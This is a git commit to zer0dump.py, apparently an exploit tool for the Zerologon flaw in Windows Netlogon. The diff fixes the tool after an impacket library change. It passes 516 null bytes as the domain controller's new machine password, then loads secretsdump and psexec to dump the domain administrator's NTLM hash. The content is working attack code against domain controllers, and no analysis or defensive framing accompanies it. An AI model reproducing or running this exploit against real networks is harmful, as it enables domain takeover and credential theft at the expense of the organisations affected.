ed1c8e5e298baeb78a341d69b53e0a17bd2986d1
bugbyt3 <elias@grif.io>
2020-09-14 21:14:19 +0000

    fix because impacket changes :(

--- zer0dump.py
+++ zer0dump.py
@@ -84,7 +84,7 @@ def perform_attack(dc_handle, dc_ip, target_computer, target_da="Administrator")
         rpc_con, dc_handle + '\x00',
         target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
         target_computer + '\x00',
-        update_authenticator(clientStoredCredential, sessionKey, 0), CLP
+        update_authenticator(clientStoredCredential, sessionKey, 0), b'\x00' * 516
     )
     blah.dump()
     import secretsdump, psexec
@@ -98,7 +98,6 @@ def perform_attack(dc_handle, dc_ip, target_computer, target_da="Administrator")
             self.just_dc = True
             self.just_dc_ntlm = True
             self.just_dc_user = target_da
-
             self.pwd_last_set = self.user_status = self.resumefile = \
             ┊   ┊   self.k = self.history = self.ntds = self.sam = self.security = \
         ┊   ┊   ┊   self.system = self.aesKey = self.bootkey = None
